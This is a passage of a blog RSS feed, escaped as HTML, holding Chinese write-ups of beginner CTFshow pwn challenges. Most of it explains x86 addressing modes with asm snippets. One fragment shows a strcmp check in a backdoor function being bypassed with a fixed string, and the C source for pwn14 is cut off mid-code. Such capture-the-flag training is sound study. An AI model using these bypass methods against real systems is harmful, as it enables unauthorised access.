&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfDMex.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;execve_func()&lt;/code&gt;  里有后门&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfDlTK.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;strcmp(str1,str2)&lt;/code&gt;  该函数会进行比较，str1=str2 时会返回 0，所以输入 &lt;code&gt;CTFshowPWN&lt;/code&gt;  以此绕过判断&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfDPe0.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow5-34/</guid>
            <title>CTFshow(前置基础部分-汇编,5~34)</title>
            <link>https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow5-34/</link>
            <category>pwn</category>
            <pubDate>Fri, 15 Sep 2023 11:01:15 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzU2Njk2Mzc4L2FydGljbGUvZGV0YWlscy8xMjgwNjc0Mzg=&#34;&gt;https://blog.csdn.net/m0_56696378/article/details/128067438&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQUYlODQlRTUlQUQlOTglRTUlOTklQTglRTUlQUYlQkIlRTUlOUQlODAlRTYlOTYlQjklRTUlQkMlOEYvNjY4NjQwOA==&#34;&gt;https://baike.baidu.com/item/%E5%AF%84%E5%AD%98%E5%99%A8%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F/6686408&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;pwn5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn5&#34;&gt;#&lt;/a&gt; pwn5&lt;/h1&gt;
&lt;h2 id=&#34;题目&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfMr7t.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
查看查询信息（另一个 asm 文件是用于在 C&lt;ins&gt; 源码中内嵌汇编语言。ASM 能写在任何 C&lt;/ins&gt; 合法语句中，asm 还不是 C 的标准关键字）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfQC4K.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;32 位程序，利用 ida 打开&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfQl8S.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;发现是 int 0x80，为系统调用，通过系统调用 write 函数来输出，输出结果即为 flag&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfQYbn.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;【关于 asm，给我们解释了汇编代码的含义】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfQB2F.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
系统调用（int 0x80）在后面执行，系统调用号在前面&lt;/p&gt;
&lt;h1 id=&#34;pwn6立即寻址方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn6立即寻址方式&#34;&gt;#&lt;/a&gt; pwn6（立即寻址方式）&lt;/h1&gt;
&lt;h2 id=&#34;题目-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-2&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPf1WcD.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
32 位程序，让我们计算立即寻址方式后的 eax 的值&lt;/p&gt;
&lt;p&gt;【立即寻址方式是一种操作数寻址方式。在立即寻址方式下，指令的地址字段指出的是操作数本身，而不是操作数的地址。立即寻址方式的特点是指令执行时间很短，因为它不需要访问内存取数，从而节省了访问内存的时间。立即寻址方式常用于指令的源操作数，不能用作目的操作数。例如，MOV AX,5678H 指令中的 5678H 就是一个立即数，作为源操作数直接参与指令的运算。】这意味着，将寄存器不会去将该值当作地址，直接看作一个数值&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPf1zHs.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;mov eax, 0Bh        #eax=0xBh
add  eax, 1BF48h #eax=eax+0x1BF48h
sub   eax, 1             #eax=eax-1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到 eax=0x1BF52h  (114514)&lt;/p&gt;
&lt;p&gt;所以答案 ctfshow (114514)&lt;/p&gt;
&lt;p&gt;此题 asm&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPf39Nq.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;pwn7寄存器寻址方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn7寄存器寻址方式&#34;&gt;#&lt;/a&gt; pwn7（寄存器寻址方式）&lt;/h1&gt;
&lt;h2 id=&#34;题目-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-3&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPf3JDH.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;【寄存器寻址方式：操作数在 CPU 内部的寄存器中，指令指定寄存器号。，意味着直接取指定寄存器当中的值即可】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPf3a5t.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;mov ebx, 36Dh  #ebx=0x36Dh
mov edx, ebx     #edx=ebx 
&lt;/code&gt;&lt;/pre&gt;
&lt;p 0x36D=&#34;&#34;&gt;edx=0x36Dh  (877），&lt;br /&gt;
ctfshow&lt;/p&gt;
&lt;p&gt;【asm】&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPf3R5q.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;pwn8直接寻址方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn8直接寻址方式&#34;&gt;#&lt;/a&gt; pwn8（直接寻址方式）&lt;/h1&gt;
&lt;h2 id=&#34;题目-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-4&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPf3qaR.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;【直接寻址方式：在指令中直接给出参与运算的操作数及运算结果所存放的主存地址，即在指令中直接给出有效地址。意味着直接将地址赋值给对应寄存器】&lt;/p&gt;
&lt;p&gt;32 位程序，查看汇编&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPf3XPx.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;mov ecx, dword_80490E8  #ecx=dword_80490E8 (地址就是0x80490E8)
&lt;/code&gt;&lt;/pre&gt;
&lt;p 0x80490E8=&#34;&#34;&gt;ctfshow&lt;/p&gt;
&lt;p&gt;【asm】&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfrBuR.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;pwn9-间接寻址方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn9-间接寻址方式&#34;&gt;#&lt;/a&gt; pwn9 （间接寻址方式）&lt;/h1&gt;
&lt;h2 id=&#34;题目-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-5&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfrDD1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;【间接寻址方式：间接寻址是在直接寻址的基础上面建立起来的，也就是直接寻址得到的数据是一个地址，通过这个地址找到最终的数据，也就是两次寻址，第一次得到的是地址，第二次才是目标数据】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfsnVx.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;mov esi,  offset dword_80490E8  #esi=offset dword_80490E8
mov eax, [esi]  #eax=*esi (取地址内的值，方括号意味着取该地址的值)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;利用 ida 查看其中的值&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfsBRg.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p 0x636C6557=&#34;&#34;&gt;ctfshow&lt;/p&gt;
&lt;p&gt;【asm】&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfs3xH.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;pwn10寄存器相对寻址方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn10寄存器相对寻址方式&#34;&gt;#&lt;/a&gt; pwn10（寄存器相对寻址方式）&lt;/h1&gt;
&lt;h2 id=&#34;题目-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-6&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPf27an.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;【寄存器相对寻址方式：操作数的有效地址是一个寄存器和位移量之和。地址是寄存器 + 一个偏移值，具体值在该地址里】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfWmlT.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;mov ecx, offset dword_80490E8   #ecx=dword_80490E8
add  ecx, 4   #ecx=ecx+4
mov eax, [ecx]  #eax=*ecx (取该地址的值)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;eax=*(0x80490E8+4)=&amp;quot;ome_to_CTFshow_PWN&amp;quot;&lt;/p&gt;
&lt;p ome_to_CTFshow_PWN=&#34;&#34;&gt;ctfshow&lt;/p&gt;
&lt;p&gt;【asm】&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPff3Dg.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;pwn11基址变址寻址方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn11基址变址寻址方式&#34;&gt;#&lt;/a&gt; pwn11（基址变址寻址方式）&lt;/h1&gt;
&lt;h2 id=&#34;题目-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-7&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPffd2V.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;【基址变址寻址方式：操作数的有效地址是一个基址寄存器和一个变址寄存器的内容之和。一般为寄存器直接的运算在赋值】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPffHIA.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;mov ecx, offset dword_80490E8  #exc=0x80490E8
mov edx, 2   #edx=2
mov dax,[exc+edx*2]  #ecx=*(0x80490E8+2*2)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ecx=&amp;quot;ome_to_CTFshow_PWN&amp;quot;&lt;/p&gt;
&lt;p ome_to_CTFshow_PWN=&#34;&#34;&gt;ctfshow&lt;/p&gt;
&lt;p&gt;【asm】&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPf5TZF.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;pwn12相对基址变址寻址方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn12相对基址变址寻址方式&#34;&gt;#&lt;/a&gt; pwn12（相对基址变址寻址方式）&lt;/h1&gt;
&lt;h2 id=&#34;题目-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-8&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPh3Tne.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;【相对基址变址寻址方式：操作数的有效地址是一个基址寄存器和一个变址寄存器以及一个位移量之和。一般为两个寄存器 + 一个值】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPh3j9P.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;mov  ecx, offset dword_80490E8  #ecx=80490E8
mov  edx, 1   #edi=1
add   ecx,  8  #ecx=ecx+8
mov  eax,  [ecx+edx*2-6]  #eax=*(ecx+edx*2-6)
#eax=*(80490EC)=&#39;ome_to_CTFshow_PWN&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p ome_to_CTFshow_PWN=&#34;&#34;&gt;ctfshow&lt;/p&gt;
&lt;p&gt;【asm】&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPh8uB4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;pwn13&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn13&#34;&gt;#&lt;/a&gt; pwn13&lt;/h1&gt;
&lt;h2 id=&#34;题目-9&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-9&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPh8KHJ.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;进行 gcc 编译：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zODA5Mzc5NDY=&#34;&gt;https://zhuanlan.zhihu.com/p/380937946&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gcc test.c &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;test&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#直接编译成可执行文件（-o 指定输出文件名称，默认 a.out）&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;./test  &lt;span class=&#34;token comment&#34;&gt;#运行程序&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPh8rCt.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;pwn14&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn14&#34;&gt;#&lt;/a&gt; pwn14&lt;/h1&gt;
&lt;h2 id=&#34;题目-10&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-10&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPh86v8.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;源码&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;span&gt;c&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdlib.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;define&lt;/span&gt; &lt;span class=&#34;token macro-name&#34;&gt;BUFFER_SIZE&lt;/span&gt; &lt;span class=&#34;token expression&#34;&gt;&lt;span class=&#34;token number&#34;&gt;1024&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    FILE &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;fp&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; buffer&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;BUFFER_SIZE&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token class-name&#34;&gt;size_t&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    fp &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;key&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;rb&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fp &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;perror&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Nothing here!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; output&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;BUFFER_SIZE &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; offset &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    offset &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;output &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; offset&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;ctfshow&amp;#123;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fread&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;buffer&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; BUFFER_SIZE&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; fp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;size_t&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; i&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; j &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; j &lt;span class=&#34;token operator&#34;&gt;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; j&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                offset &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;output &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; offset&lt;span class=&#34;token 